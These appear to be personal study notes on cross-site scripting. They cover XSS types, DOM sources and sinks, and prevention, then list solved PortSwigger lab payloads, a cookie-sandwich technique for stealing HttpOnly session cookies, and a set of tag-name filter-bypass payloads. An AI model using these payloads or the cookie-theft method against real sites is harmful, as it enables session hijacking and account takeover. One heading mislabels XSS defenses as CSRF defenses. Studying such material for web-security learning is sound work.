# How does XSS work?
Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application.
![[cross-site-scripting.svg]]
### What are the types of XSS attacks ?
- **Reflected XSS**, where the malicious script comes from the current HTTP request.
- **Stored XSS**, where the malicious script comes from the website's database.
- **DOM-based XSS**, where the vulnerability exists in client-side code rather than server-side code.
#### 1. Reflected cross-site scripting
Reflected XSS is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. If the user visits the URL constructed by the attacker, then the attacker's script executes in the user's browser, *in the context of that user's session with the application*. At that point, the script can carry out any action, and retrieve any data, to which the user has access.
###### how to deliver the link to the victim ?
- link in an email
- tweet
	The need for an external delivery mechanism for the attack means that the impact of reflected XSS is generally less severe than stored XSS, where a self-contained attack can be delivered within the vulnerable application itself.

---
#### 2. Stored cross-site scripting
Stored XSS (also known as persistent or second-order XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

The data in question might be submitted to the application via HTTP requests; for example, <mark style="background: #FF5582A6;">comments on a blog post</mark>, <mark style="background: #ABF7F7A6;">user nicknames in a chat room</mark>, or <mark style="background: #FFB86CA6;">contact details on a customer order</mark>.

---
#### 3. DOM-based cross-site scripting
DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

In the following example, an application uses some JavaScript to read the value from an input field and write that value to an element within the HTML:
`var search = document.getElementById('search').value;`
`var results = document.getElementById('results');`
`results.innerHTML = 'You searched for: ' + search;`

If the attacker can control the value of the input field, they can easily construct a malicious value that causes their own script to execute:
`You searched for: <img src=1 onerror='/* Bad stuff here... */'>`

In a typical case, the input field would be populated from part of the HTTP request, such as a URL query string parameter, allowing the attacker to deliver an attack using a malicious URL, in the same manner as reflected XSS.
###### What is the difference between sink and source in DOM XSS ?
**Sources (input) :**
These are the entry points for user-supplied data that can be manipulated by an attacker.
- Common sources include:
    - `document.URL`, `document.documentURI`: These can be modified by the attacker to inject malicious code. 
	- `location.href`, `location.search`, `location.*`: These properties hold the URL of the current page and can be manipulated to include a payload. 
	- `window.name`, `document.referrer`: These properties can also be manipulated by attackers. 
	- Essentially, a source is any DOM property or function that allows an attacker to influence the data being used within the application.
**Sinks (processing function) :**
Sinks are where the untrusted data from the source is used, potentially leading to malicious code execution. (A sink is any point in the code where user-provided data is used without proper validation and sanitation, making it vulnerable to XSS). 
- Common sinks include:
    - `document.write()`: This function can be used to inject HTML, including malicious JavaScript. 
	- `(element).innerHTML`: This property can be used to modify the HTML content of an element, allowing for the injection of JavaScript. 
	- `eval()`: This function executes JavaScript code passed to it, making it a dangerous sink. 
	- `setTimeout`, `setInterval`, `execScript`: These functions can also be used to execute malicious JavaScript. 
In essence, a DOM-based XSS attack follows a "source-to-sink" pattern. An attacker injects malicious input into a source, which is then processed by JavaScript and passed to a sink without proper validation, resulting in the execution of the malicious code.
*in DOM XSS The server **never** sees the payload. unlike reflected XSS the payload **travels to the server and comes back in the response**.*

---
## Cross-site scripting contexts
When testing for reflected and stored XSS, a key task is to identify the XSS context :
- The location within the response where attacker-controllable data appears.
- Any input validation or other processing that is being performed on that data by the application.
## Content security policy
Content security policy (CSP) is a browser mechanism that aims to mitigate the impact of cross-site scripting and some other vulnerabilities.

## Dangling markup injection
Dangling markup injection is a technique that can be used to capture data cross-domain in situations where a full cross-site scripting exploit is not possible

## What kind of XSS payloads do we need ?
## what is DOM invader ?

## How to prevent XSS attacks
- **Filter input on arrival.** Whitelisting vs blacklisting
	- validating that it starts with a safe protocol such as HTTP and HTTPS. Otherwise someone might exploit your site with a harmful protocol like `javascript` or `data`
	- Validating that input contains only an expected set of characters
	- If a user supplies a value that it expected to be numeric, validating that the value actually contains only an integer
- **Encode data on output.**
	In an HTML context, you should convert non-whitelisted values into HTML entities:
	- `<` converts to: `&lt;`
	- `>` converts to: `&gt;`
	In a JavaScript string context, non-alphanumeric values should be Unicode-escaped:
	- `<` converts to: `\u003c`
	- `>` converts to: `\u003e`
- **Use appropriate response headers.** To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way you intend.
- **Content Security Policy.** As a last line of defence, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.
- **Sessions might be locked to additional factors like the user's IP address.**
- **Many applications hide their cookies from JavaScript using the `HttpOnly` flag**
- **The session might time out before you're able to hijack it.**

#### Sink functions
- `document.write()`
- `document.writeln()`
- `document.domain`
- `element.innerHTML`
- `element.outerHTML`
- `element.insertAdjacentHTML`
- `element.onevent`
#### jQuery sink functions
- `add()`
- `after()`
- `append()`
- `animate()`
- `insertAfter()`
- `insertBefore()`
- `before()`
- `html()`
- `prepend()`
- `replaceAll()`
- `replaceWith()`
- `wrap()`
- `wrapInner()`
- `wrapAll()`
- has()
- `constructor()`
- `init()`
- `index()`
- `jQuery.parseHTML()`
- `$.parseHTML()`
## XSS Impact ?
- Impersonate or masquerade as the victim user.
- Carry out any action that the user is able to perform.
- Read any data that the user is able to access.
- Capture the user's login credentials.
- Perform virtual defacement of the web site.
- Inject trojan functionality into the web site.

## Labs
* #Portswigger
	1. **Reflected XSS into HTML context with nothing encoded**
		This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
		*payload :*
		`<script>alert('ahmed adel')</script>`
	2. **Stored XSS into HTML context with nothing encoded**
		This lab contains a stored cross-site scripting vulnerability in the comment functionality. Solve it.
		*payload :*
		`<img src=x onerror=alert('dula')>`
	3. **DOM XSS in `document.write` sink using source `location.search`**
		normal DOM XSS attack
		*payload :*
		`"><img src=x onerror="alert('ahmed adel')">`
	4. **DOM XSS in `innerHTML` sink using source `location.search`**
		*payload :*
		on search parameter `<img src=x onerror=alert('dula')>`
		*walkthrough :*
		why if we pass script tags it will not work ?
		because the sink function here is `.innerHTML` and this function do not execute JavaScript as a part of security unlike `document.write`
	5. **DOM XSS in jQuery anchor `href` attribute sink using `location.search` source**
		*payload :*
		I have added this value at the end of the link `returnPath=javascript:alert(document.cookie)`
	6. **DOM XSS in jQuery selector sink using a `hashchange` event**
		*payload :*
		`<iframe src="https://0ad6005a04f406a480f812cb000d009d.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'">`
		*walkthrough :* 
		this is a typical jQuery vulnerability about hash change (too scroll automatically to the needed post) so we inject an XSS payload after the hash to execute the vulnerability but to make this exploit trigger at the victim browser we need to create `iframe` that open the normal website and when it load we append the payload after the hash to trigger the alert  
	7. **Reflected XSS into attribute with angle brackets HTML-encoded**
		*payload :*
		`adel" onmouseover=alert("dula") "hi`
	8. **Stored XSS into anchor `href` attribute with double quotes HTML-encoded**
		*payload :*
		`javascript:alert(1)`
	9. **Reflected XSS into a JavaScript string with angle brackets HTML encoded**
		Replace your input with the following payload to break out of the JavaScript string and inject an alert:
		*payload :*
	    `'-alert(1)-'`
	10. **DOM XSS in `document.write` sink using source `location.search` inside a select element**
		*payload :*
		normal link + `&storeId=<script>alert(123)</script>`
		*walkthrough :*
		 when I looked at the JavaScript code I found this line `document.write('<select name="storeId">');` so I clicked the check stock button and look at the request and I found these parameter at the request `productId=2&storeId=London` so I changed the `storeId` value into `<script>alert(123)</script>`
	11. **DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**
		*payload :*
		`{{$on.constructor('alert(1)')()}}`
		*walkthrough :*
		this curly braces evaluate data and execute it `{{ }}` but we cannot execute 
		`{{ alert() }}` due to security protocols in the framework
	12. **Reflected DOM XSS**
		*payload :*
		`dula\"-alert()}//`
	13. **Stored DOM XSS**
		*payload :*
		`</p><img src=x onerror=alert()><p>`
	14. **Reflected XSS into HTML context with most tags and attributes blocked**
		*payload :*
		``<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>``
		*walkthrough :*
		search for allowed tag and allowed attribute to solve the lab
	15. **Reflected XSS into HTML context with all tags blocked except custom ones**
		*payload :*
		`https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x`
		*walkthrough :*
		solve by creating custom tag
# Common defenses against CSRF
#### 1. Filter input on arrival (in backend)
- validate on input to be string or integer (whitelist)
- validate on protocol used `javascript`, `data`
#### 2. Encode data on output
encode the output to prevent it from being interpreted as active content
#### 3. Use appropriate response headers
`Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way you intend
#### 4. Content Security Policy
#### 5. using a template engine
#### 6. JavaScript library
such as `DOMPurify`

```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Radar

#-----------------#
#- chart data    -#
#-----------------#
data:
  - item: "Back-End Code"
    user: "Effective against the attack"
    score: 90
  - item: "Browser"
    user: "Effective against the attack"
    score: 60
  - item: "Server"
    user: "Effective against the attack"
    score: 0
  - item: "Client-Side Code"
    user: "Effective against the attack"
    score: 50
  - item: "WAF"
    user: "Effective against the attack"
    score: 80

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "item"
  yField: "score"
  seriesField: "user"
  meta:
    score:
      alias: "Score"
      min: 0
      nice: true
  xAxis:
    line: null
    tickLine: null
  yAxis:
    label: false
    grid:
      alternateColor: "rgba(0, 0, 0, 0.1)"
  point: {}
  area: {}
```


###### Notes
- malicious script often is `javascript` but it can be `HTML`, `VBscript`, `flash` or any language that browser can execute
- Chrome from version 92 onward (July 20th, 2021), cross-origin `iframes` are prevented from calling `alert()`
- **How do I prevent XSS in PHP?** Filter your inputs with a whitelist of allowed characters and use type hints or type casting. Escape your outputs with `htmlentities` and `ENT_QUOTES` for HTML contexts, or JavaScript Unicode escapes for JavaScript contexts.
- **How do I prevent XSS in Java?** Filter your inputs with a whitelist of allowed characters and use a library such as Google Guava to HTML-encode your output for HTML contexts, or use JavaScript Unicode escapes for JavaScript contexts.
- the browser's "View source" option won't work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript.
- that browsers behave differently with regards to URL-encoding, Chrome, Firefox, and Safari will URL-encode `location.search` and `location.hash`, while IE11 and Microsoft Edge (pre-Chromium) will not URL-encode these sources.
- If a framework like AngularJS is used, it may be possible to execute JavaScript without angle brackets or events.
- malicious script often is `javascript` but it can be `HTML`, `VBscript`, `flash` or any language that browser can execute
- Client-side (JavaScript) validation is only for user experience. It is NOT a security layer

# Techniques

#### 1. Stealing `HttpOnly` cookies with the cookie sandwich technique
![[Pasted image 20260302001634.png]]
###### from XSS you set:
`document.cookie = 'param1="start';  `
`document.cookie = 'param2=end"';`

The browser does NOT replace the session cookie.
It merges everything into the Cookie header:
`Cookie: param1="start; session=secret; param2=end"`

Browsers send cookies in a specific order:
1. Longer path first
2. Then older cookies first

###### So attacker does this:
`document.cookie = "$Version=1; path=/json;";`

If victim’s session cookie has:
`path=/`
Then `/json` is longer.

##### Requirement to succeed
1. Server supports RFC2109 legacy parsing
2. Reflection of cookie value
3. CORS with credentials
4. `HttpOnly` cookie present
5. Attacker has XSS or CORS execution
6. Cookie order manipulation works
#### 2. Tag Name technique
1 - `<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>`
**Explain every part in the payload**
1. `alert(1)` => tag name that will be the main payload function
2. `onfocus` + `autofocus` => to force the payload to trigger
3. `tabindex=1` => to allow focus on normally unfocused element
4. `attributes[0].value` => first attribute which is `onfocus`
5. `localName` => tag name in small case
6. `,new onfocus` => allow `alert(1)` to be function not string *optional*
2 - `<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus tabindex=1>`
3 - `<null alert(1) onfocus="attributes.onfocus.value=localName,new onfocus" autofocus tabindex=1>`
4 - `<ALERT(1) onfocus="attributes[0].textContent=localName,new onfocus" autofocus tabindex=1>`
5 - `<ALERT(1) onfocus="attributes[0].nodeValue=localName,new onfocus" autofocus tabindex=1>`
6 - `<alert<img title=" src onerror=alert(1)> " onfocus=innerHTML=localName+attributes[0].value tabindex=1 autofocus>`
7 - `<ALERT(1) onfocus="event=localName;part=onfocus,onfocus=Function,eval(part[1])()" tabindex=1 autofocus>`
8 - `<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus contenteditable>`
9 - `<ALERT(1) onfocus="getAttributeNode('onfocus').value=localName,onfocus()" autofocus tabindex=1>`
10 - `<alert<img title=" src onerror=alert(1)> " onfocus=setHTMLUnsafe(localName+title) tabindex=1 autofocus>`
11 - `<ALERT(1) onfocus="event=localName;classList=onfocus,onfocus=Function,eval(classList[1])()" tabindex=1 autofocus>`